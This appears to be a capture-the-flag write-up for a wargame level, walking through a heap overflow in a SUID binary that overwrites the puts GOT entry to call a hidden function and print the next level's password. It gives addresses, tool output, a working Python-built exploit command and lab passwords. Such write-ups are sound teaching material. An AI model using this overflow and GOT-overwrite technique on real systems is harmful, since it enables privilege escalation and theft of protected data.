# level7

## 1. Connect to the VM

The password for `level7`, obtained by solving `level6`, is:

```text
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

Connect with:

```bash
ssh level7@localhost -p 4242
```

## 2. Read the source

The equivalent C code obtained by decompiling the binary is available in
`source.c`.

The binary is owned by `level8` and has the SUID bit set. It therefore runs
with `level8` privileges.

The program allocates two structures and two buffers on the heap:

```c
first = malloc(sizeof(*first));
first->buffer = malloc(8);
second = malloc(sizeof(*second));
second->buffer = malloc(8);
```

It then copies the two command-line arguments without checking their size:

```c
strcpy(first->buffer, argv[1]);
strcpy(second->buffer, argv[2]);
```

Finally, it reads the next password into the global variable `c`, but only
prints `~~`:

```c
fgets(c, 68, fopen("/home/user/level8/.pass", "r"));
puts("~~");
```

The unused function `m` prints the content of `c`:

```c
void m(void)
{
	printf("%s - %d\n", c, (int)time(NULL));
}
```

The objective is to redirect the call to `puts` toward `m`.

## 3. Understand the heap overflow

The program copies our two arguments into two buffers:

```c
strcpy(first->buffer, argv[1]);
strcpy(second->buffer, argv[2]);
```

`strcpy` does not check the argument length. A long `argv[1]` overflows the
first buffer and can overwrite the pointer `second->buffer`.

Use `ltrace` to display the allocated addresses:

```bash
ltrace ./level7 AAAA BBBB
```

The relevant output is:

```text
malloc(8)                    = 0x0804a008
malloc(8)                    = 0x0804a018
malloc(8)                    = 0x0804a028
malloc(8)                    = 0x0804a038
strcpy(0x0804a018, "AAAA")   = 0x0804a018
```

Following the allocation order in the source:

```text
0x0804a008 = first structure
0x0804a018 = first->buffer
0x0804a028 = second structure
0x0804a038 = second buffer
```

The second structure starts at `0x0804a028`. Its first 4 bytes contain
`second->id`, so the `second->buffer` pointer field is 4 bytes later:

```text
&second->buffer = 0x0804a028 + 4 = 0x0804a02c
```

The distance between them is 20 bytes:

```text
first->buffer:     0x0804a018
&second->buffer:   0x0804a02c

0x0804a02c - 0x0804a018 = 0x14 = 20 bytes
```

We overwrite `second->buffer` like this:

```text
argv[1] = ["A" repeated 20 times][new destination address]
```

The 20 `A` characters reach the pointer. The next 4 bytes replace its
destination address.

The second `strcpy` then writes `argv[2]` to this new destination:

```text
argv[1] chooses WHERE to write.
argv[2] chooses WHAT to write.
```

## 4. Find the target addresses

Find the relocation entry used by `puts`:

```bash
objdump -R level7
```

The output contains:

```text
08049928 R_386_JUMP_SLOT   puts
```

Find the address of `m`:

```bash
objdump -d -M intel level7
```

The function starts at:

```text
m address = 0x080484f4
```

On a little-endian x86 machine, the addresses must be written as:

```text
puts GOT address = \x28\x99\x04\x08
m address        = \xf4\x84\x04\x08
```

## 5. Overwrite the GOT entry

Use the first argument to replace `second->buffer` with the address of the
`puts` GOT entry:

```text
["A" * 20][puts GOT address]
```

The second `strcpy` then copies its argument into that GOT entry. Supplying
the address of `m` replaces the address normally used by `puts`.

When the program reaches:

```c
puts("~~");
```

it executes `m()` instead, which prints the password stored in `c`.

## 6. Exploit the binary

Run:

```bash
./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') \
  $(python -c 'print "\xf4\x84\x04\x08"')
```

The output contains:

```text
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
```

This is the password stored in `flag` and can be used to connect as `level8`.
